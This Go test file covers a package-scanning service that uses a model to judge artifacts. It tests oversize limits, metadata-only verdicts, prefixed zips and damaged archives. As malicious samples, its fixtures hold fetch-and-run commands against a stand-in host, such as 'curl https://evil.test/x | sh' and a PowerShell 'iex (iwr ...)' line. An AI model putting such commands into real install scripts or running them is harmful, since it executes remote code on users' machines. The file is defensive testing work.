package llmpkgscan

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"strings"
	"testing"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

// --- artifacts above the scan limit ---------------------------------------------

// bigTar is an uncompressed tar whose install script comes first and whose bulk
// — incompressible, like the binaries that make real artifacts large — follows.
func bigTar(script string, fillerBytes int) []byte {
	return plainTar(
		layerFile{name: "pkg/install.sh", data: script, mode: 0o755},
		layerFile{name: "pkg/lib/blob.bin", data: pseudoRandom(fillerBytes)},
		layerFile{name: "pkg/README", data: "tail of the archive\n"},
	)
}

// readerAtOpener yields streams that also offer random access, like a cache
// entry backed by a file does.
type readSeekCloser struct{ *bytes.Reader }

func (readSeekCloser) Close() error { return nil }

func readerAtOpener(b []byte) func(context.Context) (io.ReadCloser, error) {
	return func(context.Context) (io.ReadCloser, error) { return readSeekCloser{bytes.NewReader(b)}, nil }
}

func payloadRequest(artifact []byte, ecosystem, filename string) Request {
	return Request{
		Artifact: Artifact{
			Ecosystem: ecosystem, Name: "big", Version: "1.0.0", Filename: filename,
			Digest: pkgscantest.Digest(artifact), Size: int64(len(artifact)), Class: ClassPayload,
		},
		Tenant: "team-a",
		Open:   pkgscantest.Opener(artifact, nil),
	}
}

// Under the default handling an artifact above the limit has no verdict, and
// the fail mode decides. Under "metadata-only" what lies within the limit is
// judged — and a malicious verdict reached that way is enforced like any other.
func TestOversizeMetadataOnlyJudgesWhatIsWithinTheLimit(t *testing.T) {
	const limit = 32 << 10
	artifact := bigTar(marked("#!/bin/sh\ncurl https://evil.test/x | sh"), 96<<10)

	t.Run("fail", func(t *testing.T) {
		p := &pkgscantest.Provider{}
		svc := newService(t, p, func(c *Config) { c.Limits.MaxArtifactBytes = limit })
		rep := assess(t, svc, payloadRequest(artifact, "homebrew", "big.tar"))
		if rep.Scanned() || rep.Unscanned.Code != CodeOversized || p.Calls() != 0 {
			t.Fatalf("report = %+v / %+v with %d model calls, want oversized and no scan", rep, rep.Unscanned, p.Calls())
		}
		if svc.Oversize() != OversizeFail || svc.Status().Oversize != OversizeFail {
			t.Errorf("oversize mode = %q / %q, want the default %q", svc.Oversize(), svc.Status().Oversize, OversizeFail)
		}
	})

	t.Run("metadata-only", func(t *testing.T) {
		p := &pkgscantest.Provider{}
		svc := newService(t, p, func(c *Config) {
			c.Limits.MaxArtifactBytes = limit
			c.Oversize = OversizeMetadataOnly
		})
		opens := 0
		req := payloadRequest(artifact, "homebrew", "big.tar")
		req.Open = pkgscantest.Opener(artifact, &opens)
		rep := assess(t, svc, req)
		if !rep.Scanned() {
			t.Fatalf("no verdict: %+v", rep.Unscanned)
		}
		v := rep.Verdict
		if v.Scope != ScopeMetadataOnly || !v.Truncated {
			t.Errorf("scope = %q truncated = %v, want metadata-only and truncated", v.Scope, v.Truncated)
		}
		if rep.Disposition != DispositionMalicious || svc.Gate(rep).Served() {
			t.Errorf("disposition = %s: a malicious metadata-only verdict must refuse", rep.Disposition)
		}
		if len(v.Evidence) == 0 || v.Evidence[0].Path != "pkg/install.sh" || !v.Evidence[0].Verified {
			t.Errorf("evidence = %+v, want the install script within the limit", v.Evidence)
		}
		coverage := strings.Join(v.Coverage, " ")
		if !strings.Contains(coverage, "metadata-only view") || !strings.Contains(coverage, "NOT") {
			t.Errorf("coverage does not say what went unread: %v", v.Coverage)
		}
		// The tail of the archive is beyond the limit and must not be claimed.
		if strings.Contains(p.LastMaterial(), "tail of the archive") {
			t.Error("content beyond the scan limit was shown to the model: more than the limit was read")
		}
		if opens != 1 {
			t.Errorf("the artifact was opened %d times, want once", opens)
		}
		if svc.Metrics().MetadataOnly != 1 {
			t.Errorf("metadata-only counter = %d, want 1", svc.Metrics().MetadataOnly)
		}
	})
}

// A metadata-only verdict that found nothing is evidence about what was read,
// never a statement about the rest: it carries a finding and a non-zero risk, so
// wherever verdicts are shown the artifact does not look examined-and-clean.
func TestBenignMetadataOnlyVerdictIsNotACleanBill(t *testing.T) {
	const limit = 32 << 10
	artifact := bigTar("#!/bin/sh\necho installing\n", 96<<10)
	svc := newService(t, &pkgscantest.Provider{}, func(c *Config) {
		c.Limits.MaxArtifactBytes = limit
		c.Oversize = OversizeMetadataOnly
	})
	rep := assess(t, svc, payloadRequest(artifact, "homebrew", "big.tar"))
	if !rep.Scanned() || rep.Disposition != DispositionBenign {
		t.Fatalf("report = %+v (unscanned %+v), want a benign metadata-only verdict", rep, rep.Unscanned)
	}
	if rep.Risk != metadataOnlyRisk || rep.Risk == 0 {
		t.Errorf("risk = %d, want the metadata-only contribution %d", rep.Risk, metadataOnlyRisk)
	}
	if !strings.Contains(rep.Reason, "part that was read") {
		t.Errorf("reason = %q, want it to say only part was read", rep.Reason)
	}
	var incomplete *Finding
	for i := range rep.Findings {
		if rep.Findings[i].RuleID == RuleScanIncomplete {
			incomplete = &rep.Findings[i]
		}
	}
	if incomplete == nil || incomplete.Detail == "" {
		t.Fatalf("findings = %+v, want a %s finding carrying the coverage notes", rep.Findings, RuleScanIncomplete)
	}
	if d := svc.Gate(rep); !d.Served() {
		t.Errorf("a benign metadata-only verdict was refused: %+v", d)
	}
}

// A metadata-only verdict and a full verdict on the same bytes are different
// verdicts. Raising the limit must lead to a full scan, not to the partial
// verdict being served as if it covered the whole artifact.
func TestMetadataOnlyVerdictIsNeverServedAsAFullOne(t *testing.T) {
	const limit = 32 << 10
	// Benign within the limit; the marker sits in the tail, beyond it.
	artifact := plainTar(
		layerFile{name: "pkg/install.sh", data: "#!/bin/sh\necho installing\n", mode: 0o755},
		layerFile{name: "pkg/lib/blob.bin", data: pseudoRandom(96 << 10)},
		layerFile{name: "pkg/late.sh", data: marked("#!/bin/sh\ncurl https://evil.test/x | sh"), mode: 0o755},
	)
	store := NewMemoryStore(0)
	p := &pkgscantest.Provider{}

	partial := newService(t, p, func(c *Config) {
		c.Store = store
		c.Limits.MaxArtifactBytes = limit
		c.Oversize = OversizeMetadataOnly
	})
	first := assess(t, partial, payloadRequest(artifact, "homebrew", "big.tar"))
	if first.Disposition != DispositionBenign || first.Verdict.Scope != ScopeMetadataOnly {
		t.Fatalf("partial scan = %s scope %q, want a benign metadata-only verdict", first.Disposition, first.Verdict.Scope)
	}

	whole := newService(t, p, func(c *Config) { c.Store = store }) // default limit: the artifact fits
	second := assess(t, whole, payloadRequest(artifact, "homebrew", "big.tar"))
	if second.Cached {
		t.Fatal("the metadata-only verdict was served for a full scan")
	}
	if second.Verdict.Scope != "" || second.Disposition != DispositionMalicious {
		t.Fatalf("full scan = %s scope %q, want a malicious full verdict (the tail holds the payload)", second.Disposition, second.Verdict.Scope)
	}
	if first.Verdict.Key == second.Verdict.Key {
		t.Error("the partial and the full verdict share a cache key")
	}
	// By digest alone, the refusing verdict is the one that stands.
	if _, standing, ok := whole.StoredVerdict(context.Background(), pkgscantest.Digest(artifact)); !ok || !standing.Refused {
		t.Errorf("StoredVerdict = %+v / %v, want the full, refusing verdict", standing, ok)
	}
}

// A zip keeps its directory at the end, so a streamed prefix cannot list one.
// With random access to the artifact — what a cache entry offers — the directory
// is read in full and members are read wherever they lie, within the unpack
// limits: a payload at the end of an oversized zip is still found.
func TestOversizedZipIsListedThroughRandomAccess(t *testing.T) {
	const limit = 32 << 10
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.CreateHeader(&zip.FileHeader{Name: "lib/native.bin", Method: zip.Store})
	_, _ = io.WriteString(w, pseudoRandom(96<<10))
	w, _ = zw.Create("tools/install.ps1")
	_, _ = io.WriteString(w, marked("iex (iwr https://evil.test/x)"))
	_ = zw.Close()
	artifact := buf.Bytes()

	p := &pkgscantest.Provider{}
	svc := newService(t, p, func(c *Config) {
		c.Limits.MaxArtifactBytes = limit
		c.Oversize = OversizeMetadataOnly
	})
	req := payloadRequest(artifact, "nuget", "big.1.0.0.nupkg")
	req.Open = readerAtOpener(artifact)
	rep := assess(t, svc, req)
	if !rep.Scanned() {
		t.Fatalf("no verdict: %+v", rep.Unscanned)
	}
	v := rep.Verdict
	if v.Scope != ScopeMetadataOnly || v.Format != "zip" {
		t.Errorf("scope/format = %q/%q, want a metadata-only zip verdict", v.Scope, v.Format)
	}
	if rep.Disposition != DispositionMalicious || len(v.Evidence) == 0 || v.Evidence[0].Path != "tools/install.ps1" {
		t.Fatalf("disposition = %s evidence = %+v, want the install script at the end of the zip found", rep.Disposition, v.Evidence)
	}
	if !strings.Contains(strings.Join(v.Coverage, " "), "directory was read in full") {
		t.Errorf("coverage = %v, want it to say the listing is complete", v.Coverage)
	}

	// Without random access the same zip cannot be listed. That is "could not be
	// examined", decided by the fail mode — never a clean verdict on a prefix.
	streamed := newService(t, &pkgscantest.Provider{}, func(c *Config) {
		c.Limits.MaxArtifactBytes = limit
		c.Oversize = OversizeMetadataOnly
		c.FailMode = FailClosed
	})
	srep := assess(t, streamed, payloadRequest(artifact, "nuget", "big.1.0.0.nupkg"))
	if srep.Scanned() && srep.Disposition == DispositionBenign {
		t.Fatalf("a zip whose directory could not be reached got a benign verdict: %+v", srep.Verdict)
	}
	if !srep.Scanned() && streamed.Gate(srep).Served() {
		t.Errorf("an unlistable oversized zip was served under fail-closed: %+v", srep.Unscanned)
	}
}

// --- what is, and is not, examined as a single file -----------------------------

// A payload that does not unpack is a package that went unexamined — unless a
// single file is what it may honestly be. Extractors are more forgiving than a
// careful parser, so "the scanner could not unpack it" never means "the
// installer will not".
func TestSingleFileRule(t *testing.T) {
	elf := []byte(elfWith("ordinary strings", "libc.so.6"))
	script := []byte("#!/bin/sh\necho hello\n")
	prose := []byte("just some text, not an archive at all\n")

	cases := []struct {
		name     string
		data     []byte
		filename string
		single   bool
		scanned  bool // a verdict as a single file
		code     string
	}{
		{"a file its backend serves singly", prose, "Package.swift", true, true, ""},
		{"an executable nobody unpacks", elf, "tool-linux-amd64", false, true, ""},
		{"a script nobody unpacks", script, "install", false, true, ""},
		{"prose where an archive is expected", prose, "pkg-1.0.0.tgz", false, false, CodeUnsupported},
		{"prose under no name at all", prose, "", false, false, CodeUnsupported},
		// The name claims a container: bytes that are no container are a package
		// the scanner could not open, whatever else they look like.
		{"an executable named like an archive", elf, "pkg-1.0.0.tgz", false, false, CodeUnsupported},
		{"a script named like a wheel", script, "pkg-1.0-py3-none-any.whl", false, false, CodeUnsupported},
		{"even when the backend allows single files", prose, "pkg-1.0.0.tar.gz", true, false, CodeUnsupported},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := &pkgscantest.Provider{}
			svc := newService(t, p, nil)
			req := payloadRequest(tc.data, "generic", tc.filename)
			req.Artifact.SingleFile = tc.single
			rep := assess(t, svc, req)
			if tc.scanned {
				if !rep.Scanned() || rep.Verdict.Kind != KindFile {
					t.Fatalf("report = %+v (unscanned %+v), want a single-file verdict", rep.Verdict, rep.Unscanned)
				}
				return
			}
			if rep.Scanned() || rep.Unscanned.Code != tc.code || !rep.Unscanned.Content {
				t.Fatalf("report = %+v (unscanned %+v), want %s attributed to the content", rep.Verdict, rep.Unscanned, tc.code)
			}
			if p.Calls() != 0 {
				t.Errorf("the model was asked about bytes that could not be read (%d calls)", p.Calls())
			}
		})
	}
}

// --- archives built to be read differently by the scanner and the installer -----

// A zip is located from its end, so every installer unpacks one that has other
// bytes in front of it: a self-extracting stub, a shebang (a Python zipapp),
// padding. The scanner must unpack it too — and say that it is prefixed.
func TestZipBehindAPrefixIsUnpackedAndFlagged(t *testing.T) {
	inner := pkgscantest.Zip(map[string]string{
		"__main__.py": marked("import os\nos.system('id')"),
		"lib/util.py": "def f(): return 1\n",
	})
	for name, prefix := range map[string]string{
		"a zipapp shebang":       "#!/usr/bin/env python3\n",
		"a self-extracting stub": elfWith("unzipsfx"),
		// Zero bytes read as an empty tar; the zip behind them is the package.
		"padding past a sniff": strings.Repeat("\x00", 2048),
	} {
		t.Run(name, func(t *testing.T) {
			artifact := append([]byte(prefix), inner...)
			p := &pkgscantest.Provider{}
			svc := newService(t, p, nil)
			rep := assess(t, svc, payloadRequest(artifact, "pip", "tool-1.0.pyz"))
			if !rep.Scanned() {
				t.Fatalf("no verdict: %+v", rep.Unscanned)
			}
			if rep.Disposition != DispositionMalicious {
				t.Fatalf("disposition = %s: the zip behind the prefix was not read.\n%s", rep.Disposition, p.LastMaterial())
			}
			if len(rep.Verdict.Evidence) == 0 || rep.Verdict.Evidence[0].Path != "__main__.py" {
				t.Errorf("evidence = %+v, want __main__.py inside the zip", rep.Verdict.Evidence)
			}
			if !strings.Contains(strings.Join(rep.Verdict.Anomalies, " "), "does not start at the beginning") {
				t.Errorf("anomalies = %v, want the prefix reported", rep.Verdict.Anomalies)
			}
		})
	}
}

// An archive whose structure breaks off part-way has hidden its remainder from
// the review, while an installer more tolerant than the scanner may still
// unpack it. A model finding the visible part unremarkable does not clear it.
func TestArchiveThatBreaksOffPartWayIsNotCleared(t *testing.T) {
	whole := plainTar(
		layerFile{name: "pkg/index.js", data: "module.exports = 1;\n"},
		layerFile{name: "pkg/lib/a.js", data: strings.Repeat("// filler\n", 200)},
		layerFile{name: "pkg/lib/b.js", data: strings.Repeat("// filler\n", 200)},
	)
	// Corrupt the second member's header: the first member reads fine, then the
	// structure stops making sense.
	broken := append([]byte(nil), whole...)
	for i := 1024; i < 1024+512; i++ {
		broken[i] ^= 0x5a
	}
	var gzBuf bytes.Buffer
	gw := gzip.NewWriter(&gzBuf)
	_, _ = gw.Write(broken)
	_ = gw.Close()

	p := &pkgscantest.Provider{}
	svc := newService(t, p, func(c *Config) { c.Action = ActionQuarantine })
	rep := assess(t, svc, payloadRequest(gzBuf.Bytes(), "npm", "pkg-1.0.0.tgz"))
	if !rep.Scanned() {
		// Refusing to read it at all is also acceptable, as long as it is not clean.
		if rep.Unscanned.Code != CodeUnsupported {
			t.Fatalf("unscanned = %+v", rep.Unscanned)
		}
		return
	}
	v := rep.Verdict
	if v.Verdict != VerdictBenign {
		t.Fatalf("the mock judged %s; this test needs the model to find nothing", v.Verdict)
	}
	if !v.StructuralRisk || rep.Disposition != DispositionSuspicious {
		t.Fatalf("structural risk = %v, disposition = %s; want the broken archive held as suspicious despite a benign model verdict (anomalies %v)", v.StructuralRisk, rep.Disposition, v.Anomalies)
	}
	if d := svc.Gate(rep); d.Served() {
		t.Errorf("under quarantine a structurally broken archive must be held: %+v", d)
	}
	if !v.Truncated || !strings.Contains(strings.Join(v.Coverage, " "), "damaged part-way") {
		t.Errorf("coverage = %v, want it to say the archive is damaged", v.Coverage)
	}
}

// The well-formed archive it was derived from is unremarkable: the anomaly is
// the break, not the shape.
func TestWellFormedTarIsNotStructurallyFlagged(t *testing.T) {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for _, f := range []layerFile{{name: "pkg/index.js", data: "module.exports = 1;\n"}, {name: "pkg/lib/a.js", data: "// a\n"}} {
		_ = tw.WriteHeader(&tar.Header{Name: f.name, Mode: 0o644, Size: int64(len(f.data)), Typeflag: tar.TypeReg})
		_, _ = io.WriteString(tw, f.data)
	}
	_ = tw.Close()
	_ = gw.Close()
	svc := newService(t, &pkgscantest.Provider{}, nil)
	rep := assess(t, svc, payloadRequest(buf.Bytes(), "npm", "pkg-1.0.0.tgz"))
	if !rep.Scanned() || rep.Verdict.StructuralRisk || rep.Verdict.Truncated || rep.Disposition != DispositionBenign {
		t.Fatalf("report = %+v / %+v, want an unremarkable benign verdict", rep.Verdict, rep.Unscanned)
	}
}

// --- stored verdicts enforced without a scan ------------------------------------

func TestStoredVerdictAndEnforcementCounters(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	ctx := context.Background()
	evil, good := maliciousPackage(), benignPackage()

	if _, _, ok := svc.StoredVerdict(ctx, pkgscantest.Digest(evil)); ok {
		t.Fatal("a verdict exists before any scan")
	}
	assess(t, svc, request(evil, "evil-pad", "1.0.0", nil))
	assess(t, svc, request(good, "left-pad", "1.3.0", nil))
	calls := p.Calls()

	v, standing, ok := svc.StoredVerdict(ctx, pkgscantest.Digest(evil))
	if !ok || v.Verdict != VerdictMalicious || !standing.Refused {
		t.Fatalf("StoredVerdict(evil) = %+v / %+v / %v", v, standing, ok)
	}
	if v, standing, ok := svc.StoredVerdict(ctx, pkgscantest.Digest(good)); !ok || v.Verdict != VerdictBenign || standing.Refused {
		t.Fatalf("StoredVerdict(good) = %+v / %+v / %v", v, standing, ok)
	}
	for _, bad := range []string{"", "sha256:xyz", "md5:" + strings.Repeat("a", 32)} {
		if _, _, ok := svc.StoredVerdict(ctx, bad); ok {
			t.Errorf("StoredVerdict(%q) found a verdict", bad)
		}
	}
	if p.Calls() != calls {
		t.Errorf("looking up stored verdicts cost %d model calls", p.Calls()-calls)
	}

	// Enforcement on a path that does not scan is counted by path.
	svc.NoteEnforced("peer")
	svc.NoteEnforced("peer")
	svc.NoteEnforced("blob")
	got := svc.Metrics().EnforcedByPath
	if got["peer"] != 2 || got["blob"] != 1 {
		t.Errorf("enforced by path = %v, want peer:2 blob:1", got)
	}

	// Nil receivers are safe: the gate may simply not be configured.
	var none *Service
	if _, _, ok := none.StoredVerdict(ctx, pkgscantest.Digest(evil)); ok {
		t.Error("a nil service returned a verdict")
	}
	if none.ReportFor(Artifact{}, v) != nil || svc.ReportFor(Artifact{}, nil) != nil {
		t.Error("ReportFor without a service or without a verdict returned a report")
	}
	none.NoteEnforced("peer")
	if st := none.BlobStatus(ctx, pkgscantest.Digest(evil)); st.Covered || st.Refused {
		t.Errorf("a nil service reported a blob status: %+v", st)
	}
	if none.Oversize() != OversizeFail || none.Limits() != DefaultLimits() {
		t.Error("a nil service does not report the built-in defaults")
	}
}

func TestDescribeVariant(t *testing.T) {
	for want, v := range map[string]*Verdict{
		"":                           {Kind: KindArchive},
		"image":                      {Kind: KindImage},
		"single file":                {Kind: KindFile},
		"metadata only":              {Kind: KindArchive, Scope: ScopeMetadataOnly},
		"image, metadata only":       {Kind: KindImage, Scope: ScopeMetadataOnly},
		"single file, metadata only": {Kind: KindFile, Scope: ScopeMetadataOnly},
	} {
		if got := DescribeVariant(v); got != want {
			t.Errorf("DescribeVariant(%+v) = %q, want %q", v, got, want)
		}
	}
	if DescribeVariant(nil) != "" {
		t.Error("DescribeVariant(nil) is not empty")
	}
}

func TestCacheKeyVariantsAreDistinct(t *testing.T) {
	h := strings.Repeat("ab", 32)
	keys := map[string]string{}
	for _, variant := range []string{variantFull, variantMetadataOnly, variantImage} {
		k := CacheKeyVariant(h, "model", PromptVersion, variant)
		if prev, dup := keys[k]; dup {
			t.Errorf("variants %q and %q share the key %s", prev, variant, k)
		}
		keys[k] = variant
	}
	if CacheKeyVariant(h, "model", PromptVersion, variantFull) != CacheKey(h, "model", PromptVersion) {
		t.Error("the full variant's key differs from CacheKey: verdicts stored before variants existed would be orphaned")
	}
}
